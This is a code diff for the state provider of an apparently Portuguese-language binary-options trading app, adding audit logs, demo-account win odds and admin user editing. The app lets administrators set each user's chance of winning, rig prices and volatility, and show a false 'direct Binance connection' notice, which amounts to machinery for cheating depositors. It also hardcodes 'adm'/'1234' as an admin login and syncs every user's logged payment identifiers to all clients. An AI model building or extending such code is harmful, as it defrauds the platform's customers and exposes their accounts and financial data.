@@ -1,5 +1,5 @@
 import React, { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
-import { Asset, Trade, Transaction, UserAccount, PlatformConfig, VerificationData, SupportMessage } from '../types';
+import { Asset, Trade, Transaction, UserAccount, PlatformConfig, VerificationData, SupportMessage, UserLog } from '../types';
 import { INITIAL_ASSETS } from '../data/initialAssets';
 import { playSound } from '../lib/audio';
 import { 
@@ -14,7 +14,9 @@ import {
   setDoc, 
   updateDoc, 
   deleteDoc, 
-  onSnapshot
+  onSnapshot,
+  query,
+  where
 } from 'firebase/firestore';
 import { signInAnonymously, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, sendEmailVerification } from 'firebase/auth';
 
@@ -51,7 +53,7 @@ interface TradingContextType {
   placeBinaryTrade: (assetId: string, prediction: 'UP' | 'DOWN', investment: number, durationSeconds: number) => boolean;
   
   // Admin Operations
-  adminAdjustUserWinProbability: (userId: string, prob: 10 | 40 | 60 | 100) => void;
+  adminAdjustUserWinProbability: (userId: string, prob: 10 | 40 | 60 | 100, isDemo?: boolean) => void;
   adminAdjustUserBalance: (userId: string, newBalance: number, isDemo: boolean) => void;
   adminToggleUserBlock: (userId: string) => void;
   adminApproveTransaction: (txId: string) => void;
@@ -61,6 +63,8 @@ interface TradingContextType {
   adminDeleteAsset: (assetId: string) => void;
   adminConfigurePlatformSetting: (config: Partial<PlatformConfig>) => void;
   adminTriggerVolatility: (multiplier: number) => void;
+  adminDeleteUser: (userId: string) => Promise<void>;
+  adminUpdateUser: (userId: string, updatedData: Partial<UserAccount>) => Promise<void>;
   
   // User Verification & Profile
   submitVerification: (data: Omit<VerificationData, 'submittedAt'>) => void;
@@ -68,6 +72,8 @@ interface TradingContextType {
   adminApproveVerification: (userId: string) => void;
   adminRejectVerification: (userId: string) => void;
   onlineUsersCount: number;
+  logs: UserLog[];
+  logAction: (action: string, details: string) => Promise<void>;
 
   // Support & Chat Bot system definitions
   supportMessages: SupportMessage[];
@@ -229,7 +235,9 @@ const DEFAULT_CONFIG: PlatformConfig = {
   apiCustomJustification: 'Sistema operando normalmente. Conexão direta com a rede Binance e cotação em tempo real.',
   supportOpenHour: '08:00',
   supportCloseHour: '18:00',
-  supportStatusForce: 'AUTO'
+  supportStatusForce: 'AUTO',
+  supportAgentName: 'Suporte Técnico',
+  supportAgentAvatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=150&h=150'
 };
 
 export function TradingProvider({ children }: { children: React.ReactNode }) {
@@ -252,6 +260,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
   const [transactions, setTransactions] = useState<Transaction[]>([]);
   const [platformConfig, setPlatformConfig] = useState<PlatformConfig>(DEFAULT_CONFIG);
   const [supportMessages, setSupportMessages] = useState<SupportMessage[]>([]);
+  const [logs, setLogs] = useState<UserLog[]>([]);
 
   const [activeAssetId, setActiveAssetIdState] = useState<string>(() => {
     return INITIAL_ASSETS[0]?.id || '';
@@ -397,9 +406,47 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       handleFirestoreError(error, OperationType.GET, 'transactions');
     });
 
-    // 6. Sync support messages
-    const supportColRef = collection(db, 'support_messages');
-    const unsubSupport = onSnapshot(supportColRef, (snap) => {
+    // 7. Sync system audit logs
+    const logsColRef = collection(db, 'logs');
+    const unsubLogs = onSnapshot(logsColRef, (snap) => {
+      const list: UserLog[] = [];
+      snap.forEach(doc => {
+        list.push(doc.data() as UserLog);
+      });
+      list.sort((a, b) => b.timestamp - a.timestamp);
+      setLogs(list);
+    }, (error) => {
+      handleFirestoreError(error, OperationType.GET, 'logs');
+    });
+
+    return () => {
+      unsubConfig();
+      unsubAssets();
+      unsubUsers();
+      unsubTrades();
+      unsubTx();
+      unsubLogs();
+    };
+  }, [authReady]);
+
+  // 6. Sync support messages in real-time (scoped by user permissions)
+  useEffect(() => {
+    if (!authReady || !currentUser) {
+      setSupportMessages([]);
+      return;
+    }
+
+    let supportQuery;
+    if (currentUser.role === 'admin') {
+      supportQuery = collection(db, 'support_messages');
+    } else {
+      supportQuery = query(
+        collection(db, 'support_messages'),
+        where('userId', '==', currentUser.id)
+      );
+    }
+
+    const unsubSupport = onSnapshot(supportQuery, (snap) => {
       const list: SupportMessage[] = [];
       snap.forEach(docSnap => {
         list.push(docSnap.data() as SupportMessage);
@@ -411,14 +458,9 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     });
 
     return () => {
-      unsubConfig();
-      unsubAssets();
-      unsubUsers();
-      unsubTrades();
-      unsubTx();
       unsubSupport();
     };
-  }, [authReady]);
+  }, [authReady, currentUser?.id, currentUser?.role]);
 
   // Alerter sound effect for live support chat
   const msgCountRef = useRef<number>(0);
@@ -632,6 +674,25 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     const isSpecialAdmin = credential === 'adm' && password === '1234';
     const isSpecialUser = credential === 'user' && password === '1234';
 
+    const registerLoginLog = async (userObj: UserAccount) => {
+      try {
+        const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
+        const newLog: UserLog = {
+          id: logId,
+          userId: userObj.id,
+          userEmail: userObj.email,
+          userName: userObj.name,
+          role: userObj.role,
+          action: 'LOGIN',
+          details: `Utilizador ${userObj.name} iniciou sessão com sucesso (${userObj.role})`,
+          timestamp: Date.now()
+        };
+        await setDoc(doc(db, 'logs', logId), newLog);
+      } catch (e) {
+        console.error("Login log failure:", e);
+      }
+    };
+
     // 1. Check for pre-seeded quick login shortcuts
     if (isSpecialAdmin) {
       let adminUser = users.find(u => u.role === 'admin' && u.email === 'kaleyapt@gmail.com');
@@ -657,6 +718,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       }
       setCurrentUser(adminUser);
       setRoleModeState('admin');
+      await registerLoginLog(adminUser);
       return true;
     }
 
@@ -684,6 +746,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       }
       setCurrentUser(normalUser);
       setRoleModeState('user');
+      await registerLoginLog(normalUser);
       return true;
     }
 
@@ -699,6 +762,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
           }
           setCurrentUser(freshUser);
           setRoleModeState(freshUser.role);
+          await registerLoginLog(freshUser);
           return true;
         } else {
           // Firebase authenticated but no FireStore document yet - create it!
@@ -723,6 +787,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
           await setDoc(doc(db, 'users', firebaseUser.uid), newUser).catch(err => handleFirestoreError(err, OperationType.WRITE, `users/${firebaseUser.uid}`));
           setCurrentUser(newUser);
           setRoleModeState(newUser.role);
+          await registerLoginLog(newUser);
           return true;
         }
       } catch (err: any) {
@@ -742,6 +807,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
             }
             setCurrentUser(found);
             setRoleModeState(found.role);
+            await registerLoginLog(found);
             return true;
           }
           throw new Error("Utilizador não encontrado no sistema local.");
@@ -759,11 +825,33 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       }
       setCurrentUser(found);
       setRoleModeState(found.role);
+      await registerLoginLog(found);
       return true;
     }
 
     return false;
   }, [users]);
+
+  // System log action
+  const logAction = useCallback(async (action: string, details: string) => {
+    try {
+      const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
+      const userObj = currentUserRef.current;
+      const newLog: UserLog = {
+        id: logId,
+        userId: userObj?.id || 'anonymous',
+        userEmail: userObj?.email || 'anonymous@kwanza.ao',
+        userName: userObj?.name || 'Visitante Anónimo',
+        role: userObj?.role || 'user',
+        action,
+        details,
+        timestamp: Date.now()
+      };
+      await setDoc(doc(db, 'logs', logId), newLog);
+    } catch (err) {
+      console.error("Failed to write system log:", err);
+    }
+  }, []);
 
   // Sign up - writes to Firebase Auth and Firestore
   const signUp = useCallback(async (name: string, email: string, password?: string, initialRole: 'admin' | 'user' = 'user', skipSetUser: boolean = false) => {
@@ -821,11 +909,25 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     };
     
     await setDoc(doc(db, 'users', uid), newUser)
-      .then(() => {
+      .then(async () => {
         if (!skipSetUser) {
           setCurrentUser(newUser);
           setRoleModeState(initialRole);
         }
+        
+        // Write the system log action manually since currentUser is not yet in ref
+        const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
+        const newLog: UserLog = {
+          id: logId,
+          userId: newUser.id,
+          userEmail: newUser.email,
+          userName: newUser.name,
+          role: newUser.role,
+          action: 'CADASTRO',
+          details: `Utilizador ${newUser.name} se registou na plataforma (${newUser.role})`,
+          timestamp: Date.now()
+        };
+        await setDoc(doc(db, 'logs', logId), newLog).catch(e => console.error(e));
       })
       .catch(err => handleFirestoreError(err, OperationType.WRITE, `users/${uid}`));
 
@@ -838,17 +940,23 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
   }, []);
 
   const logout = useCallback(() => {
+    if (currentUser) {
+      logAction('LOGOUT', `Utilizador ${currentUser.name} terminou sessão`);
+    }
     signOut(auth).catch(err => console.warn("Sign out failure:", err));
     setCurrentUser(null);
     setRoleModeState('user');
     localStorage.removeItem('kwanza_current_user');
-  }, []);
+  }, [currentUser, logAction]);
 
   const switchDemoMode = useCallback((isDemo: boolean) => {
     if (!currentUser) return;
     updateDoc(doc(db, 'users', currentUser.id), { isDemo })
+      .then(() => {
+        logAction('ALTERAR_CONTA', `Alterou para conta ${isDemo ? 'DEMO' : 'REAL'}`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUser.id}`));
-  }, [currentUser]);
+  }, [currentUser, logAction]);
 
   // Deposits & Withdrawals - writes to Firestore
   const requestDeposit = useCallback((amount: number, ibanOrPhone: string, method: string) => {
@@ -872,8 +980,11 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     };
 
     setDoc(doc(db, 'transactions', txId), newTx)
+      .then(() => {
+        logAction('DEPOSITO_SOLICITADO', `Solicitou depósito de ${amount} AOA via ${method} (Identificador: ${ibanOrPhone})`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.WRITE, `transactions/${txId}`));
-  }, [currentUser]);
+  }, [currentUser, logAction]);
 
   const requestWithdrawal = useCallback((amount: number, ibanOrPhone: string, method: string) => {
     if (!currentUser) return false;
@@ -912,11 +1023,14 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
         ibanOrPhone
       };
       setDoc(doc(db, 'transactions', txId), newTx)
+        .then(() => {
+          logAction('LEVANTAMENTO_SOLICITADO', `Solicitou levantamento de ${amount} AOA via ${method} (Destino: ${ibanOrPhone})`);
+        })
         .catch(err => handleFirestoreError(err, OperationType.WRITE, `transactions/${txId}`));
     }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUser.id}`));
 
     return true;
-  }, [currentUser]);
+  }, [currentUser, logAction]);
 
   // Spot trading buy/sell
   const openSpotTrade = useCallback((assetId: string, type: 'BUY' | 'SELL', quantity: number) => {
@@ -959,11 +1073,14 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
         profit: 0
       };
       setDoc(doc(db, 'trades', tradeId), newTrade)
+        .then(() => {
+          logAction('ABRIR_TRADE_SPOT', `Abriu trade SPOT de ${asset.name} (${type}) com custo de ${currentCost} AOA`);
+        })
         .catch(err => handleFirestoreError(err, OperationType.WRITE, `trades/${tradeId}`));
     }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUser.id}`));
 
     return true;
-  }, [currentUser, assets, platformConfig]);
+  }, [currentUser, assets, platformConfig, logAction]);
 
   // Closing Spot trades
   const closeSpotTrade = useCallback((tradeId: string) => {
@@ -1003,10 +1120,14 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
           closeTime: Date.now(),
           status: 'CLOSED',
           profit: currentProfit
-        }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `trades/${tradeId}`));
+        })
+        .then(() => {
+          logAction('FECHAR_TRADE_SPOT', `Fechou trade SPOT com ID ${tradeId}. Lucro/Prejuízo: ${currentProfit} AOA`);
+        })
+        .catch(err => handleFirestoreError(err, OperationType.UPDATE, `trades/${tradeId}`));
       }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userToUpdate.id}`));
     }
-  }, [assets, trades]);
+  }, [assets, trades, logAction]);
 
   // Binary Contracts (Timed options)
   const placeBinaryTrade = useCallback((assetId: string, prediction: 'UP' | 'DOWN', investment: number, durationSeconds: number) => {
@@ -1042,6 +1163,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       prediction,
       duration: durationSeconds,
       timeLeft: durationSeconds,
+      isDemo: currentUser.isDemo,
       profit: -investment
     };
 
@@ -1066,13 +1188,16 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     });
 
     setDoc(doc(db, 'trades', tradeId), newTrade)
+      .then(() => {
+        logAction('ABRIR_TRADE_BINARIO', `Abriu contrato binário em ${asset.name} (Previsão: ${prediction}, Investimento: ${investment} AOA, Duração: ${durationSeconds}s)`);
+      })
       .catch(err => {
         console.warn("Optimistic update error setting trade document:", err);
         handleFirestoreError(err, OperationType.WRITE, `trades/${tradeId}`);
       });
 
     return true;
-  }, [currentUser, assets, platformConfig]);
+  }, [currentUser, assets, platformConfig, logAction]);
 
   // In-memory binary countdown tick loop (with Firestore persistence on settle)
   useEffect(() => {
@@ -1090,7 +1215,11 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
               const asset = assetsRef.current.find(a => a.id === t.assetId);
               
               const globalProb = platformConfigRef.current.globalWinProbability ?? 0;
-              const winProbability = globalProb > 0 ? globalProb : (userTarget?.winProbability ?? 60);
+              const winProbability = globalProb > 0 
+                ? globalProb 
+                : (t.isDemo 
+                    ? (userTarget?.winProbabilityDemo ?? userTarget?.winProbability ?? 60) 
+                    : (userTarget?.winProbability ?? 60));
               const globalPayout = platformConfigRef.current.winPayoutPercentage ?? 80;
               const winMultiplier = 1 + globalPayout / 100;
               
@@ -1130,7 +1259,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
               }
 
               if (userTarget) {
-                const userDemo = currentUserRef.current?.id === userTarget.id && currentUserRef.current.isDemo;
+                const userDemo = t.isDemo !== undefined ? t.isDemo : (currentUserRef.current?.id === userTarget.id && currentUserRef.current.isDemo);
                 const field = userDemo ? 'demoBalance' : 'balance';
                 
                 // Write settlement back to user document in Firestore
@@ -1140,7 +1269,7 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
 
                 // OPTIMISTIC UPDATE: Increment client-side currentUser balance immediately so the settlement result is instant
                 if (currentUserRef.current && currentUserRef.current.id === userTarget.id) {
-                  const targetField = currentUserRef.current.isDemo ? 'demoBalance' : 'balance';
+                  const targetField = t.isDemo !== undefined ? (t.isDemo ? 'demoBalance' : 'balance') : (currentUserRef.current.isDemo ? 'demoBalance' : 'balance');
                   setCurrentUser(prev => {
                     if (!prev) return null;
                     return {
@@ -1291,23 +1420,34 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
   }, []);
 
   // ADMIN ACTIONS - Writes directly into Firestore
-  const adminAdjustUserWinProbability = useCallback((userId: string, prob: 10 | 40 | 60 | 100) => {
-    updateDoc(doc(db, 'users', userId), { winProbability: prob })
+  const adminAdjustUserWinProbability = useCallback((userId: string, prob: 10 | 40 | 60 | 100, isDemo?: boolean) => {
+    const field = isDemo ? 'winProbabilityDemo' : 'winProbability';
+    updateDoc(doc(db, 'users', userId), { [field]: prob })
+      .then(() => {
+        logAction('ADMIN_AJUSTAR_PROBABILIDADE', `Administrador alterou a probabilidade de ganho da conta ${isDemo ? 'DEMO' : 'REAL'} do utilizador ${userId} para ${prob}%`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
-  }, []);
+  }, [logAction]);
 
   const adminAdjustUserBalance = useCallback((userId: string, newBalance: number, isDemo: boolean) => {
     const field = isDemo ? 'demoBalance' : 'balance';
     updateDoc(doc(db, 'users', userId), { [field]: newBalance })
+      .then(() => {
+        logAction('ADMIN_AJUSTAR_SALDO', `Administrador alterou o saldo ${isDemo ? 'DEMO' : 'REAL'} do utilizador ${userId} para ${newBalance} AOA`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
-  }, []);
+  }, [logAction]);
 
   const adminToggleUserBlock = useCallback((userId: string) => {
     const target = usersRef.current.find(u => u.id === userId);
     if (!target) return;
-    updateDoc(doc(db, 'users', userId), { isBlocked: !target.isBlocked })
+    const nextStatus = !target.isBlocked;
+    updateDoc(doc(db, 'users', userId), { isBlocked: nextStatus })
+      .then(() => {
+        logAction('ADMIN_BLOQUEIO_UTILIZADOR', `Administrador ${nextStatus ? 'BLOQUEOU' : 'DESBLOQUEOU'} o utilizador ${userId}`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
-  }, []);
+  }, [logAction]);
 
   const adminApproveTransaction = useCallback((txId: string) => {
     const tx = transactionsRef.current.find(t => t.id === txId && t.status === 'PENDING');
@@ -1324,10 +1464,13 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
         balance: tx.type === 'DEPOSIT' ? targetUser.balance + addition : targetUser.balance
       }).then(() => {
         updateDoc(doc(db, 'transactions', txId), { status: 'APPROVED' })
+          .then(() => {
+            logAction('ADMIN_APROVAR_TRANSACAO', `Administrador aprovou transação ${tx.type} com ID ${txId} de ${tx.amount} AOA para ${targetUser.name}`);
+          })
           .catch(err => handleFirestoreError(err, OperationType.UPDATE, `transactions/${txId}`));
       }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${targetUser.id}`));
     }
-  }, []);
+  }, [logAction]);
 
   const adminRejectTransaction = useCallback((txId: string) => {
     const tx = transactionsRef.current.find(t => t.id === txId && t.status === 'PENDING');
@@ -1340,14 +1483,20 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
           balance: targetUser.balance + tx.amount
         }).then(() => {
           updateDoc(doc(db, 'transactions', txId), { status: 'REJECTED' })
+            .then(() => {
+              logAction('ADMIN_REJEITAR_TRANSACAO', `Administrador rejeitou levantamento com ID ${txId} de ${tx.amount} AOA para ${targetUser.name} (Saldo devolvido)`);
+            })
             .catch(err => handleFirestoreError(err, OperationType.UPDATE, `transactions/${txId}`));
         }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${targetUser.id}`));
       }
     } else {
       updateDoc(doc(db, 'transactions', txId), { status: 'REJECTED' })
+        .then(() => {
+          logAction('ADMIN_REJEITAR_TRANSACAO', `Administrador rejeitou depósito com ID ${txId} de ${tx.amount} AOA`);
+        })
         .catch(err => handleFirestoreError(err, OperationType.UPDATE, `transactions/${txId}`));
     }
-  }, []);
+  }, [logAction]);
 
   const adminCreateAsset = useCallback((assetData: Omit<Asset, 'id' | 'history' | 'changePercent' | 'previousPrice'>) => {
     const id = assetData.symbol.toLowerCase().replace('/', '');
@@ -1367,8 +1516,11 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     };
     
     setDoc(doc(db, 'assets', id), newAsset)
+      .then(() => {
+        logAction('ADMIN_CRIAR_ATIVO', `Administrador criou novo ativo ${assetData.name} (${assetData.symbol}) a ${assetData.price} AOA`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.WRITE, `assets/${id}`));
-  }, []);
+  }, [logAction]);
 
   const adminUpdateAssetPrice = useCallback((assetId: string, price: number) => {
     const a = assets.find(asset => asset.id === assetId);
@@ -1389,23 +1541,54 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       high,
       low,
       history: nextHistory
-    }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `assets/${assetId}`));
-  }, [assets]);
+    })
+    .then(() => {
+      logAction('ADMIN_ATUALIZAR_PRECO', `Administrador atualizou o preço de ${a.name} para ${price} AOA`);
+    })
+    .catch(err => handleFirestoreError(err, OperationType.UPDATE, `assets/${assetId}`));
+  }, [assets, logAction]);
 
   const adminDeleteAsset = useCallback((assetId: string) => {
     deleteDoc(doc(db, 'assets', assetId))
+      .then(() => {
+        logAction('ADMIN_APAGAR_ATIVO', `Administrador removeu o ativo com ID ${assetId}`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.DELETE, `assets/${assetId}`));
-  }, []);
+  }, [logAction]);
 
   const adminConfigurePlatformSetting = useCallback((config: Partial<PlatformConfig>) => {
     updateDoc(doc(db, 'config', 'platform'), config)
+      .then(() => {
+        logAction('ADMIN_CONFIGURAR_PLATAFORMA', `Administrador alterou configurações da plataforma: ${JSON.stringify(config)}`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, 'config/platform'));
-  }, []);
+  }, [logAction]);
 
   const adminTriggerVolatility = useCallback((multiplier: number) => {
     updateDoc(doc(db, 'config', 'platform'), { marketVolatilityMultiplier: multiplier })
+      .then(() => {
+        logAction('ADMIN_DISPARAR_VOLATILIDADE', `Administrador alterou multiplicador de volatilidade para ${multiplier}x`);
+      })
       .catch(err => handleFirestoreError(err, OperationType.UPDATE, 'config/platform'));
-  }, []);
+  }, [logAction]);
+
+  const adminDeleteUser = useCallback(async (userId: string) => {
+    try {
+      await deleteDoc(doc(db, 'users', userId));
+      logAction('ADMIN_ELIMINAR_UTILIZADOR', `Administrador removeu permanentemente o utilizador com ID ${userId}`);
+    } catch (err) {
+      handleFirestoreError(err, OperationType.DELETE, `users/${userId}`);
+    }
+  }, [logAction]);
+
+  const adminUpdateUser = useCallback(async (userId: string, updatedData: Partial<UserAccount>) => {
+    try {
+      await updateDoc(doc(db, 'users', userId), updatedData);
+      logAction('ADMIN_EDITAR_UTILIZADOR', `Administrador editou dados do utilizador ${userId}: ${JSON.stringify(updatedData)}`);
+    } catch (err) {
+      handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`);
+    }
+  }, [logAction]);
 
   // Verification profiles
   const submitVerification = useCallback((data: Omit<VerificationData, 'submittedAt'>) => {
@@ -1418,8 +1601,12 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
     updateDoc(doc(db, 'users', currentUserRef.current.id), {
       verificationStatus: 'PENDING',
       verificationData,
-    }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUserRef.current?.id}`));
-  }, []);
+    })
+    .then(() => {
+      logAction('SUBMETER_VERIFICACAO', `Utilizador submeteu documentos de verificação de identidade para aprovação`);
+    })
+    .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUserRef.current?.id}`));
+  }, [logAction]);
 
   const updateProfileBasicData = useCallback((data: { firstName: string; lastName: string; birthDate: string; location: string; contactNumber: string }) => {
     if (!currentUserRef.current) return;
@@ -1442,40 +1629,51 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
         ...currentVerificationData,
         ...data,
       }
-    }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUserRef.current?.id}`));
-  }, []);
+    })
+    .then(() => {
+      logAction('ATUALIZAR_PERFIL', `Utilizador atualizou informações de perfil básico: ${data.firstName} ${data.lastName}`);
+    })
+    .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${currentUserRef.current?.id}`));
+  }, [logAction]);
 
   const adminApproveVerification = useCallback((userId: string) => {
     updateDoc(doc(db, 'users', userId), {
       isVerified: true,
       verificationStatus: 'APPROVED',
-    }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
-  }, []);
+    })
+    .then(() => {
+      logAction('ADMIN_APROVAR_VERIFICACAO', `Administrador aprovou a verificação de identidade do utilizador ${userId}`);
+    })
+    .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
+  }, [logAction]);
 
   const adminRejectVerification = useCallback((userId: string) => {
     updateDoc(doc(db, 'users', userId), {
       isVerified: false,
       verificationStatus: 'REJECTED',
-    }).catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
-  }, []);
+    })
+    .then(() => {
+      logAction('ADMIN_REJEITAR_VERIFICACAO', `Administrador rejeitou a verificação de identidade do utilizador ${userId}`);
+    })
+    .catch(err => handleFirestoreError(err, OperationType.UPDATE, `users/${userId}`));
+  }, [logAction]);
 
   const sendSupportMessage = useCallback(async (text: string, customUserId?: string) => {
     if (!currentUserRef.current) return;
     
     // Determine the subject userId of this support session
-    const convoUserId = currentUserRef.current.role === 'admin' 
-      ? (customUserId || 'admin') 
-      : currentUserRef.current.id;
+    const isReplier = !!customUserId;
+    const convoUserId = isReplier ? customUserId : currentUserRef.current.id;
 
     const messageId = `msg-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
     const newMsg: SupportMessage = {
       id: messageId,
       userId: convoUserId,
-      userName: currentUserRef.current.role === 'admin' 
-        ? (convoUserId === 'admin' ? 'Atendimento Geral' : 'Usuário Suporte') 
+      userName: isReplier 
+        ? 'Usuário Suporte' 
         : currentUserRef.current.name,
       senderId: currentUserRef.current.id,
-      senderName: currentUserRef.current.role === 'admin' ? 'Suporte Técnico' : currentUserRef.current.name,
+      senderName: isReplier ? 'Suporte Técnico' : currentUserRef.current.name,
       text: text.trim(),
       timestamp: Date.now()
     };
@@ -1558,11 +1756,15 @@ export function TradingProvider({ children }: { children: React.ReactNode }) {
       adminDeleteAsset,
       adminConfigurePlatformSetting,
       adminTriggerVolatility,
+      adminDeleteUser,
+      adminUpdateUser,
       submitVerification,
       updateProfileBasicData,
       adminApproveVerification,
       adminRejectVerification,
       onlineUsersCount,
+      logs,
+      logAction,
       supportMessages,
       sendSupportMessage,
       adminResetSystem
